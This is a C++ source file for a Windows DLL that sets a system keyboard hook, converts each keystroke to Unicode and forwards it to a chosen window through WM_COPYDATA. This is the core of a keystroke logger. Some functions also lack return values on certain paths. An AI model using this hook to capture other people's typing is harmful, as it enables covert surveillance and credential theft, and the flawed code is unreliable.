// KeyboardDll.cpp: 与预编译标头对应的源文件
#include "framework.h"
#define DLL_EXPORT
#include "KeyboardDll.h"

// 当使用预编译的头时，需要使用此源文件，编译才能成功。
#define _countof(array) (sizeof(array) / sizeof(array[0]))
//global variant
HINSTANCE g_hMod;
HHOOK g_hHookKeyboard;
TCHAR g_szBuff[buff_size] = { 0 };

#pragma data_seg("Shared")
	HWND g_hwnd = NULL;
#pragma data_seg()

#pragma comment(linker, "/SECTION:Shared,RWS")

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hMod = hModule;
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

DLL_API BOOL InstallHook(int idHook, DWORD dwThreadId, HWND hwnd)
{
	if (!g_hHookKeyboard)
	{
		g_hwnd = hwnd;
		g_hHookKeyboard = SetWindowsHookEx(idHook, KeyboardProc, g_hMod, dwThreadId);
		if (!g_hHookKeyboard)
		{
			return FALSE;
		}
	}
}

DLL_API BOOL UninstallHook()
{
	if (g_hHookKeyboard)
	{
		if (!UnhookWindowsHookEx(g_hHookKeyboard))
		{
			return FALSE;
		}
		g_hHookKeyboard = NULL;
		return TRUE;
	}
}

LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	BYTE bKeyState[buff_size];
	COPYDATASTRUCT copyDataStruct = { 0 };

	if (nCode < 0)
		return CallNextHookEx(NULL, nCode, wParam, lParam);

	if (nCode == HC_ACTION)
	{
		GetKeyboardState(bKeyState);
		bKeyState[VK_SHIFT] = HIBYTE(GetKeyState(VK_SHIFT));
		ZeroMemory(g_szBuff, sizeof(g_szBuff));
		ToUnicode(wParam, lParam >> 16, bKeyState, g_szBuff, _countof(g_szBuff), 0);
		copyDataStruct.cbData = sizeof(g_szBuff);
		copyDataStruct.lpData = g_szBuff;
		SendMessage(g_hwnd, WM_COPYDATA, (WPARAM)g_hwnd, (LPARAM) & copyDataStruct);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}